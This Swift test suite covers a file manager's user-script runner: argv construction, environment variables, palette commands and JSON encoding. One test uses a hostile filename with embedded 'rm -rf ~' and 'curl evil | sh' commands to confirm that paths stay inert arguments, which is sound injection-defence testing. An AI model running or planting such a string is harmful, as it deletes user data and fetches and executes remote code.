import Foundation
import Testing

@testable import DirnexCore

@Suite("UserScript")
struct UserScriptTests {
    private let shell = "/bin/zsh"

    private func context(
        selection: [String],
        current: String? = "/Users/me/Pictures",
        other: String? = "/Users/me/Backup"
    ) -> UserScriptContext {
        UserScriptContext(selection: selection, currentDirectory: current, otherDirectory: other)
    }

    // MARK: - Invocation shape

    @Test("combined mode is one invocation with every selected path as an argument")
    func combinedArgv() {
        let script = UserScript(
            name: "Zip these",
            command: "zip -r out.zip \"$@\"",
            runMode: .combined
        )
        let invocations = script.invocations(
            in: context(selection: ["/a/one.txt", "/a/two.txt"]),
            shell: shell
        )
        #expect(invocations.count == 1)
        let one = invocations[0]
        #expect(one.executablePath == shell)
        // ["-c", <script>, <name as $0>, files…]
        #expect(
            one.arguments == ["-c", "zip -r out.zip \"$@\"", "Zip these", "/a/one.txt", "/a/two.txt"]
        )
        #expect(one.currentDirectoryPath == "/Users/me/Pictures")
    }

    @Test("perFile mode is one invocation per selected path, each with a single file argument")
    func perFileArgv() {
        let script = UserScript(name: "To WebP", command: "cwebp \"$1\"", runMode: .perFile)
        let invocations = script.invocations(
            in: context(selection: ["/a/one.png", "/a/two.png", "/a/three.png"]),
            shell: shell
        )
        #expect(invocations.count == 3)
        #expect(
            invocations.map { $0.arguments.last } == ["/a/one.png", "/a/two.png", "/a/three.png"]
        )
        // Each perFile run gets exactly one file after the name.
        #expect(invocations.allSatisfy { $0.arguments.dropFirst(3).count == 1 })
        #expect(
            invocations.allSatisfy { $0.arguments.prefix(3) == ["-c", "cwebp \"$1\"", "To WebP"] }
        )
    }

    @Test("combined with an empty selection still runs once with no file arguments")
    func combinedEmptySelectionRunsOnce() {
        let script = UserScript(name: "Status", command: "git status", runMode: .combined)
        let invocations = script.invocations(in: context(selection: []), shell: shell)
        #expect(invocations.count == 1)
        #expect(invocations[0].arguments == ["-c", "git status", "Status"])
    }

    @Test("perFile with an empty selection produces no invocations")
    func perFileEmptySelectionRunsNothing() {
        let script = UserScript(name: "To WebP", command: "cwebp \"$1\"", runMode: .perFile)
        #expect(script.invocations(in: context(selection: []), shell: shell).isEmpty)
    }

    // MARK: - Security: filenames never touch the command line as text

    @Test("a hostile filename arrives as one inert argument, never spliced into the script text")
    func hostileFilenameIsInert() {
        let script = UserScript(name: "Echo", command: "echo \"$1\"", runMode: .perFile)
        let evil = "/tmp/$(rm -rf ~); `curl evil | sh` && echo pwned.txt"
        let invocations = script.invocations(in: context(selection: [evil]), shell: shell)
        // The script body is unchanged; the malicious path is a single, separate argument.
        #expect(invocations[0].arguments == ["-c", "echo \"$1\"", "Echo", evil])
        // Nothing from the filename leaked into the command text the shell parses.
        #expect(invocations[0].arguments[1] == "echo \"$1\"")
    }

    @Test("a filename with a space stays a single argument (no re-splitting)")
    func spaceInFilenameNotSplit() {
        let script = UserScript(name: "Cat", command: "cat \"$@\"", runMode: .combined)
        let invocations = script.invocations(
            in: context(selection: ["/a/my report.txt", "/a/plain.txt"]),
            shell: shell
        )
        #expect(
            invocations[0].arguments == [
                "-c",
                "cat \"$@\"",
                "Cat",
                "/a/my report.txt",
                "/a/plain.txt"
            ]
        )
    }

    // MARK: - Environment contract

    @Test("environment carries the selection and both panel directories")
    func environmentContract() {
        let environment = context(selection: ["/a/one.txt", "/a/two.txt"]).environment()
        #expect(environment[UserScriptEnvironment.currentDirectory] == "/Users/me/Pictures")
        #expect(environment[UserScriptEnvironment.otherDirectory] == "/Users/me/Backup")
        #expect(environment[UserScriptEnvironment.selectionCount] == "2")
        #expect(environment[UserScriptEnvironment.selectedPaths] == "/a/one.txt\n/a/two.txt")
    }

    @Test("the other-panel variable is absent when there is no second pane")
    func otherDirectoryOmittedWhenNil() {
        let environment = context(selection: ["/a/one.txt"], other: nil).environment()
        #expect(environment[UserScriptEnvironment.otherDirectory] == nil)
        #expect(environment[UserScriptEnvironment.selectionCount] == "1")
    }

    @Test("every invocation of a run shares the same context environment")
    func perFileInvocationsShareEnvironment() {
        let script = UserScript(name: "Each", command: ":", runMode: .perFile)
        let ctx = context(selection: ["/a/one", "/a/two"])
        let invocations = script.invocations(in: ctx, shell: shell)
        #expect(invocations.allSatisfy { $0.environment == ctx.environment() })
        // The per-run environment describes the whole selection, not just this run's file.
        #expect(invocations[0].environment[UserScriptEnvironment.selectionCount] == "2")
    }

    // MARK: - A panel that is not a folder on this disk (M24 Slice 5)

    /// The whole of the rule, from the side a script sees: no `DIRNEX_CURRENT_DIR` at all, rather
    /// than a temp directory standing in for a folder the user is not looking at.
    @Test("the panel variable is absent when the panel is not a folder on this disk")
    func currentDirectoryOmittedWhenPanelIsNotLocal() {
        let environment = context(selection: ["/tmp/copy/a.bin"], current: nil).environment()
        #expect(environment[UserScriptEnvironment.currentDirectory] == nil)
        // The rest of the contract is untouched — the files are what the script acts on, and they
        // are as real as they ever were.
        #expect(environment[UserScriptEnvironment.selectionCount] == "1")
        #expect(environment[UserScriptEnvironment.selectedPaths] == "/tmp/copy/a.bin")
        #expect(environment[UserScriptEnvironment.otherDirectory] == "/Users/me/Backup")
    }

    /// Absent from the *environment* is not nowhere to run: the process still starts somewhere
    /// real, which is the first handed file\'s folder.
    @Test("the process runs from the first handed file when the panel has no folder")
    func workingDirectoryFallsBackToTheFirstFile() {
        let ctx = context(selection: ["/tmp/copy-1/a.bin", "/tmp/copy-2/b.bin"], current: nil)
        #expect(ctx.workingDirectory == "/tmp/copy-1")
        let script = UserScript(name: "Each", command: "wc -c \"$1\"", runMode: .perFile)
        let invocations = script.invocations(in: ctx, shell: shell)
        // Every invocation of a run shares one working directory, exactly as they share one
        // environment — a `perFile` script does not get a cwd per file.
        #expect(invocations.map(\.currentDirectoryPath) == ["/tmp/copy-1", "/tmp/copy-1"])
    }

    /// The narrowness control: a panel that *is* a folder on this disk keeps naming itself, and
    /// keeps being where the process starts, whatever the selection holds.
    @Test("a local panel still names itself and still runs there")
    func localPanelIsUnchanged() {
        let ctx = context(selection: ["/tmp/copy-1/a.bin"])
        #expect(ctx.workingDirectory == "/Users/me/Pictures")
        #expect(ctx.environment()[UserScriptEnvironment.currentDirectory] == "/Users/me/Pictures")
    }

    /// Nowhere to run at all — no local folder and nothing handed over — makes **no** invocations
    /// rather than launching a shell in whatever directory the process happened to be in.
    @Test("a context with neither a folder nor a selection launches nothing")
    func noWorkingDirectoryLaunchesNothing() {
        let ctx = context(selection: [], current: nil)
        #expect(ctx.workingDirectory == nil)
        #expect(UserScript(name: "Both", command: ":", runMode: .combined)
            .invocations(in: ctx, shell: shell).isEmpty)
        #expect(UserScript(name: "Each", command: ":", runMode: .perFile)
            .invocations(in: ctx, shell: shell).isEmpty)
    }

    /// The control beside it: a `combined` script with nothing selected is still one invocation
    /// whenever the panel is a folder — the directory-scoped script the run mode exists for.
    @Test("a combined script with nothing selected still runs in a local panel")
    func combinedWithNoSelectionStillRunsLocally() {
        let invocations = UserScript(name: "Tidy", command: "ls", runMode: .combined)
            .invocations(in: context(selection: []), shell: shell)
        #expect(invocations.count == 1)
        #expect(invocations[0].currentDirectoryPath == "/Users/me/Pictures")
    }

    // MARK: - Palette command bridge

    @Test("commandID namespaces the script and round-trips back to its name")
    func commandIDRoundTrip() {
        let script = UserScript(name: "To WebP", command: "cwebp \"$1\"")
        #expect(script.commandID == "userScript.To WebP")
        #expect(UserScript.name(fromCommandID: script.commandID) == "To WebP")
        // A non-script id is not mistaken for one.
        #expect(UserScript.name(fromCommandID: "file.copy") == nil)
    }

    @Test("paletteCommand carries the name as title plus the script's keywords")
    func paletteCommandMetadata() {
        let script = UserScript(
            name: "To WebP",
            command: "cwebp \"$1\"",
            runMode: .perFile,
            keywords: ["image", "convert"]
        )
        let command = script.paletteCommand
        #expect(command.id == "userScript.To WebP")
        #expect(command.title == "To WebP")
        #expect(command.category == .file)
        #expect(command.keywords.contains("image"))
        #expect(command.keywords.contains("script"))
        #expect(command.shortcut == nil)
    }

    // MARK: - Codable

    @Test("a script round-trips through JSON with its run mode and keywords")
    func codableRoundTrip() throws {
        let script = UserScript(
            name: "To WebP",
            command: "cwebp \"$1\" -o \"${1%.*}.webp\"",
            runMode: .perFile,
            keywords: ["image"]
        )
        let data = try JSONEncoder().encode(script)
        let decoded = try JSONDecoder().decode(UserScript.self, from: data)
        #expect(decoded == script)
    }

    @Test("run mode decodes from its stable string raw values")
    func runModeRawValues() {
        #expect(UserScriptRunMode(rawValue: "combined") == .combined)
        #expect(UserScriptRunMode(rawValue: "perFile") == .perFile)
        #expect(UserScriptRunMode.allCases.count == 2)
    }

    @Test("a bound script advertises its key to the palette; an unbound one has no shortcut")
    func paletteCommandCarriesFunctionKey() {
        let bound = UserScript(name: "To PNG", command: "sips", functionKey: 9)
        #expect(bound.paletteCommand.shortcut == CommandShortcut(key: "F9", modifiers: .function))
        #expect(bound.paletteCommand.shortcut?.display == "F9")
        #expect(UserScript(name: "Plain", command: "x").paletteCommand.shortcut == nil)
    }

    @Test("a function key round-trips through Codable")
    func functionKeyRoundTrip() throws {
        let script = UserScript(name: "Tidy", command: "tidy", functionKey: 4)
        let decoded = try JSONDecoder().decode(
            UserScript.self,
            from: try JSONEncoder().encode(script)
        )
        #expect(decoded.functionKey == 4)
        #expect(decoded == script)
    }
}
